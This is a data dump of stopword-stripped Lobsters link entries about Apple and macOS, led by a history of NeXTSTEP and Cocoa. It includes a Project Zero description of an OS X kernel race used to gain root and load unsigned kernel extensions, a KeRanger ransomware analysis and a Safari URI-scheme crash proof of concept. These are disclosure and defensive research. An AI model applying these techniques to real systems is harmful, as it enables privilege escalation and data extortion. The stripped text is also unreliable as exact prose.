library o x cocoa first shipped march turn based nextstep originally capitalized nextstep operating development environment next founded steve job upon resigning apple stripped power following attempted boardroom coup nextstep next computer state art computer expensive education market next targeted hardware business flagging next forced close factory becoming software company focused custom application development enterprise nextstep development platform renamed openstep ported hardware operating system including intel processor sun workstation apple dire strait needed replace aging mac o modern robust operating system failing produce one apple acquired next order make nextstep basis eventually became mac o x january annual macworld expo trade show steve job triumphantly returned onstage apple employee first time since time explain thought apple needed survive become great nextstep technology could help apple achieve video job demonstrates openstep macworld expo january short presentation macworld expo january job demonstrated technology would become cocoa software development system would eventually used thousand io app developer around world steve job showing apple developer future would look like one indeed today io developer would find remarkably similar everyday experience fact job showing apple developer new released next almost decade earlier video steve job introduces nextstep objectoriented development environment world indeed nextstep productive development environment year next computer revealed sir tim bernerslee cern used create worldwideweb tim bernerslee first web browsereditor running nextstep made next development environment ahead time macworld demo job told little parable point time well known computer industry job got idea macintosh graphical user interface team apple visited xerox parc parc palo alto research center bluesky computer research lab started xerox create office future parc staff led chm fellow robert taylor leading computer scientist day among chm fellow chuck thacker butler lampson bob metcalfe lynn conway charles geschke john warnock among luminary chm fellow alan kay kay envisioned dynabook tabletlike computer would dynamic medium learning thacker lampson designed technology available time interim dynabook might partially make real kay idea result alto personal workstation designed single user running world first graphical user interface gui window icon menu controlled using mouse xerox alto visitor see chm revolution exhibit much whose source code chm released public progenitor way almost desktop computer user interact machine today xerox alto chm macworld demo job revealed actually missed glimpse two parc technology critical future one pervasive networking personal computer xerox ethernet invented every one alto workstation new paradigm programming dubbed objectoriented programming alan kay kay working dan ingalls adele goldberg designed new programming language development environment embodied paradigm running alto kay called system smalltalk intended simple enough child use program would consist object modeled thing real world animal vehicle differed traditional procedureoriented procedural programming routine procedure operate data input stored separately smalltalk object consisted data grouped together routine method operated data kay imagined program dynamic system object sending message object receiving message would use select many routine method run message sent different object would result receiving object executing routine different others example dog object cat object would respond speak message differently dog would run bark method cat would run meow method smalltalk development environment graphical window menu fact smalltalk exact gui steve job saw smalltalk gui composed collection interacting object discussed example window object could sent message draw would forward object inside including button slider object would particular method drawing job visit parc enthralled surface detail gui completely missed radical way created object result programming graphical application macintosh would become much difficult smalltalk said job introduction next computer macintosh revolution making easier end user software developer paid bear develop look time take make gui user interface take time graphical user interface gui development environment circa courtesy parc library next computer job planned fix exact shortcoming macintosh parc technology missing mac would become central feature next next computer like workstation designed live permanently networked environment job called interpersonal computing though simply renaming xerox thacker lampson called personal distributed computing likewise dynamic objectoriented programming smalltalk model provided basis software development nextstep according job nextstep would reduce time developer create application user interface instead using smalltalk however next chose objectivec programming language would provide technical foundation success next apple software platform next two decade beyond objectivec remains use apple today io o x development though apple introduced new swift language may one day replace objectivec created brad cox add smalltalkstyle objectorientation traditional procedureoriented c significant advantage smalltalk program written smalltalk could stand alone run smalltalk program installed along entire smalltalk runtime virtual machine much like java program today meant smalltalk resource intensive using significantly memory running often slower comparable c program could run also like java smalltalk program user interface convention looking feeling different application native environment run udell reimplementing smalltalk idea c cox made possible objectivec programmer organize program architecture using smalltalk higher level abstraction finetuning performancecritical code procedural c meant objectivec program could run fast traditional c program moreover need installed alongside smalltalk virtual machine memory footprint comparable c program fully native platform would look feel application system cox benefit objectivec program fully compatible c could utilize hundred c library already written unix platform particularly advantageous next nextstep based unix could get leg program could run developer could simply wrap existing c code base new objectoriented gui fully functional application objectivec hybrid nature allowed next programmer best smalltalk c world value would combination software developer early computer professional complaining software crisis widely distributed graph predicted cost programming would eclipse cost hardware software became ever complex slayton pp famously ibm project shipped late overbudget horribly buggy ensmenger pp slayton pp ibm produced report claiming best programmer anywhere twentyfive time productive average programmer ensmenger p programmer frequently optimizing machine code clever trick save memory time said practitioner black art ensmenger p thus impossible manage concern great nato convened conference computer scientist garmisch switzerland see software programming could turned discipline like engineering wake debacle chm fellow fred brook ibm manager charge wrote seminal text software engineering mythical manmonth brook famously outlined became known brook software team reach certain size thus complexity software increase adding programmer actually increase cost delay release software brook claimed best developed small surgical team led chief programmer responsible architectural decision subordinate implementation brook problem cost complexity software remained unsolved appeared software industry might perpetual state crisis brook revisited thesis claimed despite modest gain improved programming language single technology silver bullet could increase programmer productivity order improvement would elevate average programmer level exceptional one brook brad cox begged differ cox argued objectoriented programming could used create library software object developer could buy offtheshelf easily combine like lego set create program fraction time interchangeable part led original industrial revolution market reusable offtheshelf software object would lead software industrial revolution cox cox objectivec language test bed vision cox started company stepstone sell library object developer steve job engineer next saw cox vision largely compatible licensed objectivec stepstone stepstone later next engineer steve naroff heavy lifting modify language compiler next rather buy library stepstone next developed set object library using objectivec bundled kit nextstep operating system part software development environment central graphical user interface library next developer used construct application applicationkit appkit conjunction appkit next created visual tool called interface builder gave developer ability connect object program graphically part macworld presentation job demonstrated easily one could build app using interface builder process familiar io developer today job simply dragged text field slider palette window dragged slider text field make connection selecting command one object send result text field hooked slider displaying realtime numerical value slider position represented job demonstrated without writing single line code driving home point line code developer could write maintain never break user line code developer never write today appkit still primary application framework o x io uikit heavily modeled interface builder still exists part apple xcode integrated development environment ide combination objectivec appkit interface builder allowed steve job boast nextstep could make developer five ten time order magnitude improvement brook claimed could achieved job assumed audience macworld familiar brook read mythical manmonth told audience software team getting bigger sort collapse weight like building built wood build building built wood high using metaphor building job brilliantly explained comparative advantage nextstep appkit programming do equivalent starting ground floor argued app developer might add three floor functionality achieve four floor capability classic mac o toolbox apis effectively raised foundation fifth floor allowing developer reach eight floor functionality job said enabled creation killer application like pagemaker mac conjunction laser printer much create entirely new market desktop publishing job insisted capacity developer enable new kind application apple platform simply could exist apple needed foster survive grow problem job continued microsoft window caught mac window nt effectively provided seventh floor base outcompeting mac job saw next coming apple rescue nextstep interface builder tool along appkit objectoriented library provided much rich functionality box raised developer twentieth floor claimed job meant developer could eliminate code graphical application share common allowing focus code made app unique provided additional value user result job insisted would small team two ten developer could write app fully featured hundredperson team working large corporate software company like microsoft argue vision outlined job fact remarkably similar fred brook notion programming small surgical team led chief programmer difference rather chief programmer delegate grunt work subordinate coder brook described job vision work handled library object actuality cox vision except whereas cox intended object purchased open market next bundled object library part nextstep operating system development environment might actually inhibit formation aftermarket object vision cox job grunt work making application offloaded developer object nobody small team needed mere implementer forced work program foundation unlike procedural code unit precisely blackboxed encapsulated nature prevented programmer tampering enforced modularity allowed reused interchangeably developer standing given floor simply allowed mess foundation stood freed worrying internal detail object developer could focus creatively rewarding work design architecture purview chief programmer brook scheme team member would start twentieth floor collaborate equal effort would continue build upward rather diverted redoing floor upon stood promise improvement pipe dream already seen nextstep used rapid prototyping tool create first version worldwideweb though nextstep found large user base well received programmer especially academia also diehard community thirdparty next developer backing job product small shop like omnigroup lighthouse design stone design team larger eighteen case lighthouse single man case stone written fully featured application spreadsheet presentation software web browser graphic design tool moreover nextstep proved productive rapid development missioncritical custom application wall street bank national security organization like cia paying thousand dollar per license six month later fireside chat apple may worldwide developer conference job said lighthouse since acquired sun proved nextstep technology provided five ten time speed improvement implementing existing apps moreover compelling advantage nextstep would allow innovative developer create something entirely new could developed platform initially could replicated platform without huge effort nextstep tim bernerslee used create worldwideweb dell used create first ecommerce website nextstep objectoriented development environment would power innovation apple platform well twentyfirst century looking back perspective steve job remarkably prescient mac o x shipped macintosh personal computer smallscale former next developer shareware mac developer alike began write apps using appkit interface builder called cocoa developer taking advantage ecommerce web began call independent indie software developer opposed large corporate concern like microsoft adobe hundredman team apple opened iphone thirdparty software developer created app store enabling developer sell distribute apps directly consumer mobile device without set server payment system app store became ground zero new gold rush software development inviting legendary venture capitalist firm kleiner perkins caulfield byers set ifund fund mobile app startup wortham time indie mac developer like andrew stone wil shipley predicted cocoa touch app store would revolutionize software industry around million smallscale developer unfortunately year since utopian dream slowly died unicorn acquisition big corporation moved mobile market matured squeezing little guy refuse investor funding hundred competitor app store extremely difficult get one app noticed without expensive external marketing reality majority mobile developer sustain living making apps profitable developer contractor writing apps large corporation nevertheless objectoriented technology job demoed today basis every iphone ipad apple watch apple tv app steve job predict future alan kay famously said best way predict future invent cyberpunk author william gibson noted future already evenly distributed next already invented future back next never shipped computer handful lucky enough glimpse steve job needed return apple distribute future rest world coda today silicon valley focus innovation future deep history technology apple cocoa development environment often forgotten however understanding past vitally important inventing future chance future already invented one need little digging computer history museum mission preserve past physical hardware number next computer peripheral also software soul machine chm small collection next software including nextstep openstep enterprise object framework webobjects cd lacking earlier version nextstep little way next application filling collection important software contextual link computer user institution society embedded software history organization social relationship made tangible computing historian nathan ensmenger written ensmenger p thus beyond preservation also vital make meaningful story computer software legacy contextualize culture time first blog post chm curator new software history center mark beginning project collect interpret material software oral history related graphical user interface objectoriented programming software engineering starting focus next apple xerox parc look forward story like space former next apple xerox parc engineer would like contribute project please contact hhsu computerhistoryorg note objectivec work brad cox alone might become obscure footnote history programming language steve job next computer chosen basis programming nextstep cox cofounded stepstone originally called productivity product international ppi tom love promote objectoriented solution could coexist existing language objectivec originated objectoriented precompiler first version language called objectivec still used separate c preprocessor translate objc code straight c handing compiler however version language compiler insufficient next purpose took contribution steve naroff others make objectivec language know today see note tailor objectivec next need stepstone engineer steve naroff took development cox made significant addition language support next visual programming tool interfacebuilder naroff work important eventually hired steve job next later stayed apple naroff integrated objectivec directly c compiler next using open source gnu c compiler gcc working closely richard stallman eliminated separate translation step support interfacebuilder naroff added key feature language category known today class extension way dynamically add method existing class without subclassing another key feature called protocol later added next engineer bertrand serlet later became apple software vice president blaine garst later led java team apple protocol allow class inherit multiple interface specification without inheriting implementation circumventing conflict occur multiple class inheritance language like c feature later adopted java interface two feature category protocol made possible several key design pattern heavily used next appkit class library became impossible later year think objectivec without addition many contribution objectivec next engineer necessary driven practical need next developer realworld use rather need computing researcher kevin enderby worked linker assembler naroff solved method fragility problem affected dynamic library compatibility added explicit declaration construct import directive c integration serlet added method forwarding enable remote object proxy garst worked objectivec runtime key advocate referencecounted memory management modification laid groundwork objectivec longevity next later apple providing solid foundation would eventually power mac o x iphone development present day reference brook frederick p silver bullet essence accident software engineering computer mythical manmonth essay software engineering anniversary ed reading addisonwesley pub co cox brad j object oriented precompiler programming smalltalk method c language sigplan silver bullet software industrial revolution based reusable interchangeable part alter software universe byte october planning software industrial revolution ieee software objectoriented programming evolutionary approach ed reading addisonwesley pub co ensmenger nathan l computer boy take computer programmer politics technical expertise cambridge mit press slayton rebecca argument count physic computing missile defense cambridge mit press udell jon enters ninety byte october wortham jenna iphone gold rush new york time april http
591,Lobsters,mac,Apple macOS,Race you to the kernel!,http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html,race kernel,,posted ian beer google project zero o x io kernel code responsible loading setuid root binary invalidates old task port first swapping new virtual memory map pointer old task object leaving short race window manipulate memory euid process old task port invalidated going step also allows also gain entitlement o x load unsigned kernel extension reported bug apple december patched o x technical detail see original bug report also grab updated exploit task port ever tried use ptrace o x probably sorely disappointed whilst syscall exists severely limited example support peeking poking memory pretty fundamental usecase one many area xnu duality kernel evident along ptrace parallel abstraction layer mach side kernel support building debugging tool via set special mach task port process executing o x task port example allocate page memory process might use code like machvmaddresst addr machvmallocate machtaskself addr vmflagsanywhere machvmallocate mig method implemented kernel defined machvmdefs xnu kernel source first argument method current task port happened send right another task task port call method passing task task port allocation would end task virtual address space even though task made call similarly machvmread machvmwrite method allow read write memory process task port effectively giving complete control default task send right task port easy give process send right task port using standard mach messaging mechanism execve usually new task port created new process created via fork posixspawn execing new binary reset task port lead obvious question since send right process task port give complete control process deal suid binary exec call increase privilege process looking exec code find snippet mach reset task thread port nt want anyone port setuid exec able accesscontrol taskthread ipctaskreset p task sound sensible execve really complex syscall lot going diagram outline four major phase exec syscall interested along lifetime data structure phase old task port still valid via task struct give u access old vmmap still contains virtual address space task prior exec part loadmachfile method kernel create new vmmap load new executable image note though point new vmmap matched task virtual address space process phase parsemachfile method actual parse load macho image new virtual address space also phase code signature binary checked come back detail later phase loadmachfile call swaptaskmap set task struct point new vmmap target executable loaded point machvm method invoked old task port target new vmmap phase exechandlesugid check binary suid reset task port point old task port longer work somethings right highlevel view clear fundamental race condition phase vmmap swapped phase task port invalidated full readwrite access via old task port new vmmap containing loaded binary executed even suid mean use machvmwrite overwrite text segment code control diagram hard tell actually quite long period two phase certainly enough time sneak mach kernel mig call building reliable exploit one small stumbling block overcome though although try write new vmmap write userspace aslr o x binary dynamic library randomized perexec first figure kernel loaded image luckily task port lot blindly read write new vmmap also api like machvmregion ask property memory region map case loop constantly asking address lowest mapping change know changed base address image new vmmap race window phase using base address work address binary entrypoint new vmmap mark page rwx using machvmprotect overwrite shellcode using machvmwrite run rootshellsh attached exploit see action work box semirecent o x system using otool extract entrypoint suidroot executable going codesigning entitlement exec phase diagram mentioned parsemachfile phase responsible loading macho well verifying code signature present might ask relevant o x since unlike io mandatory userspace code signing quite happily execute unsigned code anyway o x use userspace code signing enforce entitlement xml blob stored macho signed part code signature kernel code check whether user space process particular entitlement via iotaskhasentitlement kernel kext loading code accept load request process running root also comapplerootlesskextmanagement entitlement particularly important since o x kext code signature enforced userspace mean kextmanagement entitlement vital part separation root userspace kernel code execution two system binary kextmanagement entitlement kextd kextload order defeat kernel code signing need first exec suidroot binary get root exec either kextload kextd get right entitlement patching kextload kextload probably easier target binary patch since standalone tool load kext without talking kextd need patch checkaccess function kextload think reach kextd try load kext patch call checkkextsignature checksignaturesofdependents kextload think succeeded load kext signed unsigned released exploit contain binary patch file remove signature check kextload o x well simple helloworld kext loadkextsh unloadkextsh script load unload run regular user look consoleapp see kernel debug printf output
592,Lobsters,mac,Apple macOS,"RandomDNS aims to improve the security, privacy and anonymity of DNSCrypt.",https://github.com/pwnsdx/RandomDNS,randomdns aim improve security privacy anonymity dnscrypt,http dnscryptorg feature randomdns use help,randomdns aim improve security privacy anonymity dnscrypt randomize server choice runtime rotate frequently dnscrypt dnscrypt protocol authenticates communication dns client dns resolver prevents dns spoofing us cryptographic signature verify response originate chosen dns resolver nt tampered information http dnscryptorg feature randomdns randomize provider runtime use e phemeral key option securely run dnscrypt proxy verifying hash copying tmp dir restricted permission launching nobody user reverse proxy enabled watch proxy process relaunch dy run multiple instance dnscrypt load balance traffic edgedns inmemory caching dns request along consistent hashing edgedns filter server list protocol country much rotate server defined time default minute support dnssec edgedns use update brew brew update brew upgrade install dnscrypt node npm brew install dnscryptproxy node npm download run randomdns npm install g randomdns sudo debug randomdns set dns setting help usage run option file option h help output usage information v version output version number l listenon string listen specific interfaceport default r rotationtime int define time wait rotating server second default second p reverseproxy bool enable edgedns reverse proxy default false reverseproxychildstartport int childrens dnscryptproxy process start incrementing port work reverseproxy enabled default thread int number child spawn set disable load balacing work reverseproxy enabled default f filter string use filter default filtershelp get full list available filter b binarydnscryptfile string use custom dnscrypt binary work binarydnscryptfilesignature changed binarydnscryptfilesignature string hash dnscrypt binary b binaryedgednsfile string use custom edgedns binary work binaryedgednsfilesignature changed binaryedgednsfilesignature string hash edgedns binary r resolverlistfile string use custom dnscrypt resolver list file work resolverlistfilesignature changed resolverlistfilesignature string hash dnscrypt resolver list file todo
594,Lobsters,mac,Apple macOS,Counterfeit Macbook charger teardown: convincing outside but dangerous inside,http://www.righto.com/2016/03/counterfeit-macbook-charger-teardown.html,counterfeit macbook charger teardown convincing outside dangerous inside,macbook charger teardown magsafe connector teardown article inside charger bridge rectifier teardown wrong charger quality power conclusion magsafe charger teardown iphone charger teardown ipad charger teardown follow twitter note datasheet datasheet,inside counterfeit macbook charger macbook charger teardown reader sent charger suspected counterfeit outside charger almost perfect match apple charger disassembling charger show different inside much simpler design lack quality feature genuine charger major safety defect inside counterfeit magsafe charger counterfeit apple charger seen past usually external flaw give away charger could fooled exterior text charger correct designed abble designed california metal ground pin fake often exclude embossed apple logo case charger nt suspiciously lightweight since written error fake charger half wonder builder learned previous article one minor flaw serial number sticker right ground pin bit crooked stuck well counterfeit magsafe charger designed apple california text genuine charger unlike many fake metal ground pin although nt connected internally right ground pin serial number label bit crooked hint something nt right photo show safety certification charger claim look genuine typo ugly font counterfeit power supply safety indication real power supply one flaw made original purchaser suspicious quality case nt seem apple standard nt feel quite like old charger tapped joint appear slightly asymmetrical see picture seam counterfeit magsafe power supply bit asymmetrical problem showed plugged charger measured output magsafe connector measured volt output got spark shorted pin since charger rated volt may seem normal behavior real charger different magsafe charger initially produce lowcurrent output volt shorting output produce spark microcontroller inside charger detects charger connected laptop charger switch full output power detail magsafe connector teardown article safety feature real charger reduces risk short circuit across pin counterfeit charger hand omits microcontroller circuit simply output full voltage time raise risk burning laptop plug connector crooked metallic debris stick magnet inside charger cracking charger open chisel reveals internal circuitry real apple charger packed full complex circuitry charger fairly low density board implemented simple flyback switching power supply view counterfeit magsafe charger case heat sink removed circuit fairly standard flyback power supply understand work look diagram going counterclockwise ac input right going fuse power converted dc bridge rectifier large filter capacitor smooth dc next switching transistor chop dc pulse fed flyback transformer transformer lowvoltage output converted back dc output diode output filter capacitor smooth dc output counterfeit magsafe power supply us standard flyback switching power supply circuit ac enters right converted dc switching transistor sends pulse flyback transformer center produce low voltage output left voltage reference generates feedback signal output fed control ic optoisolator circuit may seem complex pretty standard simple charger genuine macbook charger hand much complex circuit describe teardown charger controlled tiny ic underside board switch mosfet proper rate kilohertz generate desired output voltage control ic labeled could nt find chip match description update clever reader identified chip closeup tiny control ic inside counterfeit magsafe power supply wrong charger important feature charger isolation potentiallydangerous ac input lowvoltage output high voltage low voltage separated safety gap least simplify ul creepage clearance rule circuit board high voltage input section bottom low voltage output section top right half board two section separated large gap good left gap bridged optoisolator unfortunately trace component pas area making gap dangerously small mm moisture loose solder could bridge gap sending high voltage output counterfeit magsafe charger dangerously small distance low voltage side top high voltage side bottom nt buy counterfeit charger puzzled counterfeit charger never manage sufficient clearance distance use simple lowcomplexity circuit circuit board layout straightforward except smallest cube phone charger nt fighting every millimeter space nt take much additional effort make board safer second safety flaw heat sink provides cooling inputside mosfet outputside diode heat sink basically giant conductor two side circuit small gap separating active part circuit well large creepage clearance distance high low voltage genuine charger also make extensive use insulating tape separation counterfeit charger lack extra insulation except heatshrink tubing around fuse fusible resistor nt disassemble transformer expect also lack necessary insulation counterfeit charger metal ground pin unlike fake seen plastic pin however pin appearance connected anything photo compare underside counterfeit charger left genuine apple charger right see counterfeit simple circuit board part genuine charger crammed full part two board totally different world design complexity additional part provide better power quality improved safety real charger part reason genuine charger significantly expensive comparison counterfeit magsafe charger left genuine charger right genuine charger crammed full component counterfeit component quality power measured output power counterfeit charger oscilloscope drawing watt see output power smooth pair large spike switching transistor turn charger operates frequency kilohertz filtering inside charger reduces voltage spike would cost switching power supply operates kilohertz producing large voltage spike output see spike transistor switch followed another spike switch oscilloscope trace zoom one spike see spike measure volt peaktopeak lot noise feeding laptop output counterfeit charger large noise spike transistor switch internally conclusion counterfeit magsafe charger convincing outside attention detail opened nt completely sure counterfeit inside difference counterfeit real charger clear counterfeit much simpler circuit provides poorerquality power also ignores safety requirement le millimeter separating computer dangerous shock counterfeit charger much cheaper also dangerous computer thanks richard providing charger written bunch article charger article seems familiar probably thinking earlier article magsafe charger teardown iphone charger teardown ipad charger teardown follow twitter find new article note care component detail mosfet transistor fairchild datasheet optoisolator kento datasheet output diode namc schottky barrier rectifier unable identify control ic marked capacitor blue jnc capacitor
595,Lobsters,mac,Apple macOS,A set of URI schemes bugs that lead Safari to crash/freeze.,https://github.com/pwnsdx/iOS-URI-Schemes-Abuse-PoC,set uri scheme bug lead safari crashfreeze,iosurischemesabusepoc fixed safari technology preview exploit user must type uri address bar press enter fixed safari technology preview exploit work user least one mailbox setup fixed io macos sierra exploit require user either accept popup click link fixed io macos sierra exploit,iosurischemesabusepoc set uri scheme bug lead safari crashfreeze show uri scheme weakness used nasty thing apple aware issue decided start looking uri scheme crashsafaricom massacre wanted find way break safari fileattackhtml file bug crash user current tab without specific requirement fixed safari technology preview exploit file bug crash browser io crash current tab o x user must type uri address bar press enter fixed safari technology preview exploit mailtoiframeattackhtml mailto bug freeze safari safarifirefox mailapp o x sending bunch data mailto uri scheme work user least one mailbox setup fixed io macos sierra exploit smsattackhtml sm bug freeze sm app sending lot data sm uri scheme require user either accept popup click link fixed io macos sierra exploit
596,Lobsters,mac,Apple macOS,pmcctv - poor man's CCTV system using ffmpeg and ImageMagick,https://github.com/laurent22/pmcctv,pmcctv poor man cctv system using ffmpeg imagemagick,pmcctv poor man cctv system go installation o x http golangorgdocinstall linux http golangorgdocinstall window usage todo license,pmcctv poor man cctv system go go application capture image webcam support motion detection burst mode upload remote directory go worker capture frame regular interval using ffmpeg imagemagick compare tool used check frame similar previous one frame different enough kept otherwise deleted provide simple motion detection avoids filling hard drive duplicate frame optionally go worker setup automatically upload frame remote server frame copied using either scp rsync depending available finally another worker run regular interval clean local remote directory default frame kept day normally program capture one frame per second however motion detected burst mode activated case frame captured fast possible next second long motion detected installation o x install go http golangorgdocinstall brew install ffmpeg brew install imagemagick go get u linux install go http golangorgdocinstall sudo aptget install ffmpeg sudo aptget install imagemagick go get u note many system avconv libav installed instead ffmpeg however since avconv video capture work well ffmpeg supported window command line prompt run go get u usage usage pmcctv option application option ffmpeg path ffmpeg framedir path directory contain captured frame default picturespmcctv r remotedir remote location frame saved must contain path compatible scp eg user someip pmcctv p remoteport port remote location frame saved set whatever default scp port used b burstmodeduration duration burst mode second set disable burst mode altogether default timetolive long captured frame kept day default inputdevice name capture input device default autodetect except window help option h help show help message stop script press ctrl c todo license mit
597,Lobsters,mac,Apple macOS,PCE.js - Classic Mac OS in the Browser,https://jamesfriend.com.au/pce-js/,pcejs classic mac o browser,pcejs mac plus emulator running mac o system hack james friend demo pce ported web github home urfriendjames,pcejs mac plus emulator running mac o system hack james friend pcejs emulates classic computer browser simulation classic macintosh running system macpaint macdraw kid pix want try apps game see demo based hampa hug excellent pce emulator ported web please patient may see second black screen upon loading worth itmore demo source github web hometwitter urfriendjames contact email protected
598,Lobsters,mac,Apple macOS,New OS X Ransomware KeRanger Infected Transmission BitTorrent Client Installer,http://researchcenter.paloaltonetworks.com/2016/03/new-os-x-ransomware-keranger-infected-transmission-bittorrent-client-installer/,new o x ransomware keranger infected transmission bittorrent client installer,filecoder technical analysis mbed tl time machine backup file mitigation protect acknowledgement iocs sample ransomwareosxkeranger domain get update palo alto network,post also available 日本語 japanese march detected transmission bittorrent client installer o x infected ransomware hour installers initially posted named ransomware keranger previous ransomware o x aware filecoder discovered kaspersky lab filecoder incomplete time discovery believe keranger first fully functional ransomware seen o x platform attacker infected two installers transmission version keranger morning march identified issue infected dmg file still available downloading transmission site hxxps dmg transmission open source project possible transmission official website compromised file replaced recompiled malicious version confirm infection occurred figure keranger hosted transmission official website keranger application signed valid mac app development certificate therefore able bypass apple gatekeeper protection user installs infected apps embedded executable file run system keranger wait three day connecting command control server tor anonymizer network malware begin encrypting certain type document data file system completing encryption process keranger demand victim pay one bitcoin specific address retrieve file additionally keranger appears still active development seems malware also attempting encrypt time machine backup file prevent victim recovering backup data palo alto network reported ransomware issue transmission project apple march apple since revoked abused certificate updated xprotect antivirus signature transmission project removed malicious installers website palo alto network also updated url filtering threat prevention stop keranger impacting system technical analysis two keranger infected transmission installers signed legitimate certificate issued apple developer listed certificate turkish company id different developer id used sign previous version transmission installer code signing information found installers generated signed morning march figure code signing information keranger keranger infected transmission installers include extra file named generalrtf transmissionappcontentsresources directory us icon look like normal rtf file actually macho format executable file packed upx user click infected apps bundle executable transmissionappcontentmacostransmission copy generalrtf file librarykernelservice execute kernelservice user interface appearing figure malicious executable pretend rtf document figure keranger executes extra generalrtf file unpacking generalrtf upx determined main behavior encrypt user file hold ransom first time executes keranger create three file kernelpid kerneltime kernelcomplete library directory write current time kerneltime sleep three day note different sample keranger discovered malware also sleep three day also make request server every five minute figure keranger sleep three day fully executing generalrtf collect infected mac model name uuid upload information one server server domain subdomains onion link onion nu two domain host server accessible tor network executable keep trying connect server respond two line encoded data decoding two line using first line contains rsa public key second line written file named readmefordecrypttxt figure connect server get instruction analyzing sample server returned data readmefordecrypttxt shown following picture asks victim pay exactly one bitcoin currently around specific tor network website decrypt file website guide victim buy bitcoin somewhere else transfer attacker address figure readme file ask victim pay bitcoin figure tor website transfer bitcoin get decryption pack connecting server retrieving encryption key executable traverse user volume directory encrypt file user encrypt file volume certain file extension different extension specified malware including document doc docx docm dot dotm ppt pptx pptm pot potx potm pps ppsm ppsx xl xlsx xlsm xlt xltm xltx txt csv rtf tex image jpg jpeg audio video avi mpg wav flac archive zip rar tar gzip source code cpp asp csh class java lua database db sql email eml certificate pem figure encrypt file user specific file volume keranger statically linked open source encryption library named mbed tl formerly polarssl keranger encrypts file ie testdocx start creating encrypted version us encrypted extension ie testdocxencrypted encrypt file keranger start generating random number rn encrypts rn rsa key retrieved server using rsa algorithm store encrypted rn beginning resulting file next generate initialization vector iv using original file content store iv inside resulting file mix rn iv generate aes encryption key finally use aes key content original file write encrypted data result file figure encrypt file content aes addition behavior seems like keranger still development apparent function named createtcpsocket executecmd encrypttimemachine finished used current sample analysis suggests attacker may trying develop backdoor functionality encrypt time machine backup file well backup file encrypted victim would able recover damaged file using time machine figure function encrypttimemachine implemented used yet mitigation reported issue transmission project apple immediately identified apple since revoked abused certificate gatekeeper block malicious installers apple also updated xprotect signature cover family signature automatically updated mac computer march transmission project removed malicious installers website also updated url filtering threat prevention stop keranger impacting palo alto network customer protect user directly downloaded transmission installer official website pst march pst march may infected keranger transmission installer downloaded earlier downloaded third party website also suggest user perform following security check user older version transmission appear affected suggest user take following step identify remove keranger hold file ransom using either terminal finder check whether applicationstransmissionappcontentsresources generalrtf volumestransmissiontransmissionappcontentsresources generalrtf exist exist transmission application infected suggest deleting version transmission using activity monitor preinstalled o x check whether process named kernelservice running double check process choose open file port check whether file name like user username librarykernelservice figure process keranger main process suggest terminating quit force quit step also recommend user check whether file kernelpid kerneltime kernelcomplete kernelservice existing library directory delete figure malicious kernelservice process since apple revoked abused certificate updated xprotect signature user try open known infected version transmission warning dialog shown state transmissionapp damage computer move trash transmission opened eject disk image case see warning suggest follow apple instruction avoid affected figure o x system prevent user open infected installer acknowledgement greatly thank yi ren yuchen zhou jack wang jun wang palo alto network helping analyze keranger protect customer timely fashion thanks richard wartell ryan olson chad berndtson palo alto network assistance analysis reporting iocs sample ransomwareosxkeranger transmission generalrtf transmission transmission generalrtf domain link nu link nu link nu get update palo alto network sign receive latest news cyber threat intelligence research u
599,Lobsters,mac,Apple macOS,WWDC Wish List,http://blog.steventroughtonsmith.com/post/140141855080/wwdc-wish-list,wwdc wish list,humble broadcast development journal kept twitter prototype future update around third drag drop developer pledge support available app store available iphone ipad unleashed upon world applescript support catalyst development thread live app store find github indeed possible catalyst apps submit feedback catalyst previously documented many reason available uikit macos loading appkit bundle using appkit technically possible however list thing appreciate appkit auxiliary panel sheet proxy icon color picker cursor dock menu bar status item nsworkspace nstask system applescript earlier post service apple legacy tutorial swiftui like microsoft radar building analogy macstories tentpole feature xcode io playground pythonista io rumor terminal environment io went built darwin mosh openterm ish systemlevel drawingmarkup view apple pencil opengles custom view controller nonui extension provider extension audio unit extension key upkey event using private api mouse support api capture mouse cursor quake larger ipads external touch screen support io drafting table threecolumn view surface book turn expanded usb device support io mfi eyetv tuner game capture ftdi cable readwrite external drive file app formatpartition external volume readwrite disk image scripting shifted dramatically hundred shortcut workflow virtual machine hypervisorframework let developer build virtual machine mini vmac entitlement entitlement apply apple reminiscing twitter openstep relatively simple announced older,u list project like someday star align one thing back mind something color missing part io always bugged comprehensive support color system level one favorite bit ui since early day mac o x system color panel originally nextstep beautifully comprehensive wheel slider palette crayon swatch amazing eyedropper tool supported throughout cocoa apps mac mac apps make use color well control somewhere ui drag drop color apps even onto rich text system editor color fundamental type object desktop macos love io never gained standard color picker ui platform used artist everywhere amazing creative apps firstparty stylus accessory apple yet everybody reinvent color wheel uikit apps come mac via catalyst even jarring uikit way invoke system color picker one thing io support drag drop color never know iwork suite let drop color onto shape object fill mail safari let drop color onto rich text style thirdparty apps free implement color drag drop year although select like mindnode concept humble broadcast development kicked high gear started prototyping app manage collect color interapp drag drop support called pastel might following along development journal kept twitter like project day started mac catalyst app spent much early development brought ipad later iphone really love direction workflow opposite direction catalyst developer would go force care complexity mac first distilling something fit tiny screen allows faster development cycle building io simulator device really three scenario want color palette library app whilst developing apps web page whilst designing new piece artwork usually pixel artwork game prototyping keeping paint diary painting miniature built pastel entirely around first two scenario prototype future update around third think reflected throughout ui copy variety io developer representation instance tiny bitmap version palette context menu intentionally avoided building kind feature professional artist designer might want expect lovingly recreated whole bunch macos nscolorpanel io including favorite tab crayon picker nt much work sound pretty fun experience especially little thing like determining exactly color slider work update realtime drag drop key making pastel part advanced workflow ipad supporting drag drop pick color palette drop inside another app crazy cool see developer pledge support apps raised awareness potential capability color drag drop part io open anybody would great see place love pastel fun halo app kind scenario love even spur apple providing systemwide color picker morecomprehensive color support future version io make even interesting next update pastel likely available time read mode let use pastel splitscreen color picker window drag supporting apps available app store sounded interesting pastel available iphone ipad free try library cap item inapppurchase like want unlock larger library mac version pastel something pick sometime wwdc intention launching later summer universal purchase wo nt pay anything extra launch blast working pastel really hope like feel free send picture pretty palette library create please consider supporting color drag drop apps way back built mini streaming radio player app use home give family included local irish radio station simplistic vanilla ui true minimum viable product worked barely enough satisfy wanted put mobileradio shelf time forgotten pile abandoned project never really thought going back announcement catalyst uikit macos wwdc figured would fun build catalyst app ground mac initial intention bringing iphone ipad trawled project folder came across mobileradio figured would perfect example put lot love building radio app mac using uikit delved deep talking appkit necessary try build experience worthy macos using apple new podcasts app template replicated ui using latest apis technology io relying heavily context menu point intention shipping radio app macos otherwise inspired developer debuting catalyst apps launch macos catalina excitement figured could make showcase product sort named hcc radio high caffeine content included preset irish radio station unleashed 